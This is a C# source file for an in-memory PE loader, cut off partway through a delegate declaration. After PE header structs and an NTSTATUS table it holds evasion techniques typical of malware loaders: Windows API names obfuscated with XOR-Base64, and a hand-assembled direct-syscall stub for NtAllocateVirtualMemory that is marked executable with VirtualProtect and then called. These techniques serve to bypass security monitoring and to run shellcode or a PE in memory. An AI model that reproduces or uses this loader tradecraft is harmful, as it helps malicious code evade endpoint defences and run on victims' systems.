using System;
using System.Runtime.InteropServices;
using System.Text;                                      // For string implmentation
using System.Diagnostics;                               // For Process related works
using System.ComponentModel;                            // For Handling Win32 Exception

namespace PELoader
{
    class Program
    {
        #region PInvoke for linked lists and WinAPI for PE parsing and Executing

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic;       // Magic number
            public UInt16 e_cblp;    // Bytes on last page of file
            public UInt16 e_cp;      // Pages in file
            public UInt16 e_crlc;    // Relocations
            public UInt16 e_cparhdr;     // Size of header in paragraphs
            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
            public UInt16 e_ss;      // Initial (relative) SS value
            public UInt16 e_sp;      // Initial SP value
            public UInt16 e_csum;    // Checksum
            public UInt16 e_ip;      // Initial IP value
            public UInt16 e_cs;      // Initial (relative) CS value
            public UInt16 e_lfarlc;      // File address of relocation table
            public UInt16 e_ovno;    // Overlay number
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;    // Reserved words
            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;     // OEM information; e_oemid specific
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;    // Reserved words
            public Int32 e_lfanew;      // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        public enum MachineType : ushort
        {
            /// <summary>
            /// The content of this field is assumed to be applicable to any machine type
            /// </summary>
            Unknown = 0x0000,
            /// <summary>
            /// Intel 386 or later processors and compatible processors
            /// </summary>
            I386 = 0x014c,
            R3000 = 0x0162,
            /// <summary>
            ///  MIPS little endian
            /// </summary>
            R4000 = 0x0166,
            R10000 = 0x0168,
            /// <summary>
            /// MIPS little-endian WCE v2
            /// </summary>
            WCEMIPSV2 = 0x0169,
            /// <summary>
            /// Alpha AXP
            /// </summary>
            Alpha = 0x0184,
            /// <summary>
            /// Hitachi SH3
            /// </summary>
            SH3 = 0x01a2,
            /// <summary>
            /// Hitachi SH3 DSP
            /// </summary>
            SH3DSP = 0x01a3,
            /// <summary>
            /// Hitachi SH4
            /// </summary>
            SH4 = 0x01a6,
            /// <summary>
            /// Hitachi SH5
            /// </summary>
            SH5 = 0x01a8,
            /// <summary>
            /// ARM little endian
            /// </summary>
            ARM = 0x01c0,
            /// <summary>
            /// Thumb
            /// </summary>
            Thumb = 0x01c2,
            /// <summary>
            /// ARM Thumb-2 little endian
            /// </summary>
            ARMNT = 0x01c4,
            /// <summary>
            /// Matsushita AM33
            /// </summary>
            AM33 = 0x01d3,
            /// <summary>
            /// Power PC little endian
            /// </summary>
            PowerPC = 0x01f0,
            /// <summary>
            /// Power PC with floating point support
            /// </summary>
            PowerPCFP = 0x01f1,
            /// <summary>
            /// Intel Itanium processor family
            /// </summary>
            IA64 = 0x0200,
            /// <summary>
            /// MIPS16
            /// </summary>
            MIPS16 = 0x0266,
            /// <summary>
            /// Motorola 68000 series
            /// </summary>
            M68K = 0x0268,
            /// <summary>
            /// Alpha AXP 64-bit
            /// </summary>
            Alpha64 = 0x0284,
            /// <summary>
            /// MIPS with FPU
            /// </summary>
            MIPSFPU = 0x0366,
            /// <summary>
            /// MIPS16 with FPU
            /// </summary>
            MIPSFPU16 = 0x0466,
            /// <summary>
            /// EFI byte code
            /// </summary>
            EBC = 0x0ebc,
            /// <summary>
            /// RISC-V 32-bit address space
            /// </summary>
            RISCV32 = 0x5032,
            /// <summary>
            /// RISC-V 64-bit address space
            /// </summary>
            RISCV64 = 0x5064,
            /// <summary>
            /// RISC-V 128-bit address space
            /// </summary>
            RISCV128 = 0x5128,
            /// <summary>
            /// x64
            /// </summary>
            AMD64 = 0x8664,
            /// <summary>
            /// ARM64 little endian
            /// </summary>
            ARM64 = 0xaa64,
            /// <summary>
            /// LoongArch 32-bit processor family
            /// </summary>
            LoongArch32 = 0x6232,
            /// <summary>
            /// LoongArch 64-bit processor family
            /// </summary>
            LoongArch64 = 0x6264,
            /// <summary>
            /// Mitsubishi M32R little endian
            /// </summary>
            M32R = 0x9041
        }
        public enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
        }
        public enum SubSystemType : ushort
        {
            IMAGE_SUBSYSTEM_UNKNOWN = 0,
            IMAGE_SUBSYSTEM_NATIVE = 1,
            IMAGE_SUBSYSTEM_WINDOWS_GUI = 2,
            IMAGE_SUBSYSTEM_WINDOWS_CUI = 3,
            IMAGE_SUBSYSTEM_POSIX_CUI = 7,
            IMAGE_SUBSYSTEM_WINDOWS_CE_GUI = 9,
            IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
            IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
            IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
            IMAGE_SUBSYSTEM_EFI_ROM = 13,
            IMAGE_SUBSYSTEM_XBOX = 14
        }
        public enum DllCharacteristicsType : ushort
        {
            RES_0 = 0x0001,
            RES_1 = 0x0002,
            RES_2 = 0x0004,
            RES_3 = 0x0008,
            IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040,
            IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY = 0x0080,
            IMAGE_DLL_CHARACTERISTICS_NX_COMPAT = 0x0100,
            IMAGE_DLLCHARACTERISTICS_NO_ISOLATION = 0x0200,
            IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400,
            IMAGE_DLLCHARACTERISTICS_NO_BIND = 0x0800,
            RES_4 = 0x1000,
            IMAGE_DLLCHARACTERISTICS_WDM_DRIVER = 0x2000,
            IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE = 0x8000
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }


        [StructLayout(LayoutKind.Explicit)]
        public unsafe struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)] public UInt32 VirtualSize;
            [FieldOffset(12)] public UInt32 VirtualAddress;
            [FieldOffset(16)] public UInt32 SizeOfRawData;
            [FieldOffset(20)] public UInt32 PointerToRawData;
            [FieldOffset(24)] public UInt32 PointerToRelocations;
            [FieldOffset(28)] public UInt32 PointerToLinenumbers;
            [FieldOffset(32)] public UInt16 NumberOfRelocations;
            [FieldOffset(34)] public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)] public UInt32 Characteristics;
            public string Section
            {

                get { return new string(Name); }
            }
        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(0)]
            public MagicType Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            [FieldOffset(24)]
            public ulong ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public SubSystemType Subsystem;

            [FieldOffset(70)]
            public DllCharacteristicsType DllCharacteristics;

            [FieldOffset(72)]
            public ulong SizeOfStackReserve;

            [FieldOffset(80)]
            public ulong SizeOfStackCommit;

            [FieldOffset(88)]
            public ulong SizeOfHeapReserve;

            [FieldOffset(96)]
            public ulong SizeOfHeapCommit;

            [FieldOffset(104)]
            public uint LoaderFlags;

            [FieldOffset(108)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(224)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(232)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_NT_HEADERS64
        {
            [FieldOffset(0)]
            public UInt32 Signature;

            [FieldOffset(4)]
            public IMAGE_FILE_HEADER FileHeader;

            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_IMPORT_DESCRIPTOR
        {
            [FieldOffset(0)]
            public uint Characteristics;

            [FieldOffset(0)]
            public uint OriginalFirstThunk;     // RVA of ILT

            [FieldOffset(4)]
            public uint TimeDateStamp;

            [FieldOffset(8)]
            public uint ForwarderChain;

            [FieldOffset(12)]
            public uint Name;               // RVA of imported DLL name

            [FieldOffset(16)]
            public uint FirstThunk;         // RVA to IAT
        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_THUNK_DATA32
        {
            [FieldOffset(0)]
            public uint ForwarderString;

            [FieldOffset(0)]
            public uint Function;

            [FieldOffset(0)]
            public uint Ordinal;

            [FieldOffset(0)]
            public uint AddressOfData;
        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_THUNK_DATA64
        {
            [FieldOffset(0)]
            public ulong ForwarderString;

            [FieldOffset(0)]
            public ulong Function;

            [FieldOffset(0)]
            public ulong Ordinal;

            [FieldOffset(0)]
            public ulong AddressOfData;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_IMPORT_BY_NAME
        {

            public UInt16 Hint;
            public char Name;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_BASE_RELOCATION
        {
            [FieldOffset(0)]
            public UInt32 pagerva;

            [FieldOffset(4)]
            public UInt32 size;
        }

        /*
        // For EnumThreadDelegate

        public delegate bool EnumThreadDelegate(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool EnumThreadWindows(uint dwThreadId, EnumThreadDelegate lpfn, IntPtr lParam);

        // For EnumThreadDelegate 
        */

        #region GetLastError
        //[DllImport("Kernel32.dll")]
        //public static extern int GetLastError();

        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int GLE();

        #endregion GetLastError

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,
            MaximumNtStatus = 0xffffffff
        }

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetProcAddress(
            IntPtr handle,
            string functionname
            );

        #region VirtualProtect
        //[DllImport("Kernel32.dll")]
        //static extern bool VirtualProtect(
        //    IntPtr lpAddress,
        //    UIntPtr dwSize,
        //    uint flNewProtect,
        //    out uint lpflOldProtect);

        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VP(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
        );

        // Encrypted string:
        //public static string k = "AzU6Pi08e2I="; // Xor-Base64(Kernel32)
        //public static string vp = "Hjk6JD0xJAA6Pzw1KyQ="; // Xor-Base64(VirtualProtect)

        // VirtualProtect
        //public static IntPtr funcaddr3 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(vp)));
        //public static VP Vp = (VP)Marshal.GetDelegateForFunctionPointer(funcaddr3, typeof(VP));

        #endregion VirtualProtect

        #region VirtualAlloc
        //[DllImport("Kernel32.dll")]
        //public static extern IntPtr VirtualAlloc(
        //    IntPtr lpAddress,
        //    int dwSize,
        //    UInt32 flAllocationType,
        //    UInt32 flProtect
        //    );

        // delegate: VirtualAlloc
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr valloc(
        IntPtr lpAddress,       // process address pointer   : [in, optional] LPVOID lpAddress : As optional, So we will pass IntPtr.Zero (=null)
        uint dwSize,            // Shellcode length
        uint flAllocationType,
        uint flProtect
        );

        // delegate: NtAllocateVirtualMemory
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NTSTATUS NtAllocateVirtualMemory(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                ref UIntPtr RegionSize,
                ulong AllocationType,
                ulong Protect);

        // direct syscall: NtAllocateVirtualMemory (IF it works, no need of VirtualProtect, directly use RWX from NtAllocateVirtualMemory)
        public static byte[] bNtAllocateVirtualMemory =
        {
            0x4c, 0x8b, 0xd1,       // mov r10, rcx
            0xb8, 0x18, 0x00, 0x00, // mov eax, 18h
            0x0f, 0x05,             // syscall
            0xc3                    // ret
        };

        public static NTSTATUS syscall_NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            UIntPtr RegionSize,
            uint AllocationType,
            uint Protect)

        {
            // set byte array of bNtAllocateVirtualMemory to new byte array called syscall
            byte[] syscall = bNtAllocateVirtualMemory;

            Console.WriteLine("924");

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    Console.WriteLine("935");

                    // Change memory access to RX for our assembly code
                    if (!Vp(memoryAddress, (UIntPtr)syscall.Length, 0x40, out _))
                    {
                        throw new Win32Exception();
                    }

                    Console.WriteLine("943");

                    // Get delegate for NtAllocateVirtualMemory
                    NtAllocateVirtualMemory assembledFunction = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(NtAllocateVirtualMemory));

                    Console.WriteLine("948");

                    return (NTSTATUS)assembledFunction(
                        ProcessHandle,
                        ref BaseAddress,
                        ZeroBits,
                        ref RegionSize,
                        AllocationType,
                        Protect);
                }
            }
        }

        #endregion VirtualAlloc

        /*
        [DllImport("Kernel32.dll")]
        public static extern bool VirtualFree(
            IntPtr lpAddress,
            int dwSize,
            UInt32 dwFreeType
            );
        */

        /*
        [DllImport("Kernel32.dll")]
        public static extern bool CloseHandle(IntPtr handle);
        */

        /*
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool FreeLibrary(IntPtr hModule);
        */

        #region CreateThread
        //[DllImport("kernel32", CharSet = CharSet.Ansi)]
        //public static extern IntPtr CreateThread(
        //    IntPtr lpThreadAttributes,
        //    uint dwStackSize,
        //    IntPtr lpStartAddress,
        //    IntPtr lpParameter,
        //    uint dwCreationFlags,
        //    IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CRThread(
